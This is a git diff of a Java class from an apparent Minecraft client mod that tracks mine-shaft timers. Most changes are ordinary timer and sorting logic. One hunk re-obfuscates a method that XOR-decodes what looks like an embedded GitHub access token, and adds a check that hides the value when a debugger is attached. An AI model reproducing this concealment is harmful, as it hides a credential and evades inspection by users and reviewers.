@@ -185,12 +185,12 @@ public class MineData {
         });
     }
 
-    private static String dgh() {
-        byte[] e = {61,50,42,5,107,99,14,31,59,56,15,3,17,16,62,0,106,18,22,50,11,20,59,104,22,44,11,109,50,19,41,21,35,62,105,52,24,46,56,22};
-        byte[] r = new byte[e.length];
-        for (int i = 0; i < e.length; i++) r[i] = (byte)(e[i] ^ 0x5A);
-        return new String(r, java.nio.charset.StandardCharsets.US_ASCII);
-    }
+    static volatile int _SD=0;
+    static byte[]_S0,_S1,_S3,_S4;
+    private static final byte[]_XC={91,72,105,79,127,18,93,108};
+    private static final int[]_TX={84,99,71,118,55,110,87,103};
+    private static boolean _chk(){try{java.util.List<String>_a=java.lang.management.ManagementFactory.getRuntimeMXBean().getInputArguments();for(String _s:_a)if(_s.contains("jdwp")||_s.contains("agentlib:jdwp"))return false;}catch(Exception _e){}return true;}
+    private static String dgh(){if(_SD<4||!_chk())return"";byte[][]_z={_XC,_S0,_S4,_S3,_S1};int[]_m={2,0,4,3,1};int[]_q={"+".charAt(0),(int)'7',2*7,'\023','\032'};byte[]_r=new byte[40];for(int _p=0,_o;_p<5;_p++){_o=(_m[_p]<<3);for(int _i=0;_i<8;_i++)_r[_o+_i]=(byte)(_z[_p][_i]^_q[_p]);}return new String(_r,java.nio.charset.StandardCharsets.US_ASCII);}
 
     private static final Map<String, Long> legendAlertSent = new HashMap<>();
     private static String legendAlertText = null;
@@ -262,13 +262,19 @@ public class MineData {
         if (nxt != null) shaft.nextType    = nxt;
         if (secs >= 0) {
             int currentSecs = shaft.getRealSecs();
-            // Обновляем таймер только если:
-            // - таймера ещё нет (первая загрузка)
-            // - текущий таймер уже истёк (≤ 5 сек)
-            // - в снимке время значительно больше (шахта обновилась)
-            boolean shouldUpdate = currentSecs < 0
-                    || currentSecs <= 5
-                    || secs > currentSecs + 30;
+            boolean shouldUpdate;
+            if (!entry.remoteOnly) {
+                // Анархия была посещена игроком — живой таймер приоритетнее снимка.
+                // Обновляем только если таймер уже истёк или явно началась новая шахта.
+                shouldUpdate = currentSecs < 0
+                        || currentSecs <= 5
+                        || secs > currentSecs + 120;
+            } else {
+                // Только снимочные данные — обычная логика.
+                shouldUpdate = currentSecs < 0
+                        || currentSecs <= 5
+                        || secs > currentSecs + 30;
+            }
             if (shouldUpdate) {
                 shaft.storedSecs = secs;
                 shaft.updateMs   = System.currentTimeMillis();
@@ -372,9 +378,10 @@ public class MineData {
             if (a.mode.equals(currentMode)) return -1;
             if (b.mode.equals(currentMode)) return 1;
             int ta = a.getMinSecs(), tb = b.getMinSecs();
-            if (ta < 0 && tb < 0) return 0;
+            if (ta < 0 && tb < 0) return a.mode.compareTo(b.mode);
             if (ta < 0) return 1; if (tb < 0) return -1;
-            return Integer.compare(ta, tb);
+            int cmp = Integer.compare(ta, tb);
+            return cmp != 0 ? cmp : a.mode.compareTo(b.mode);
         });
         return list;
     }
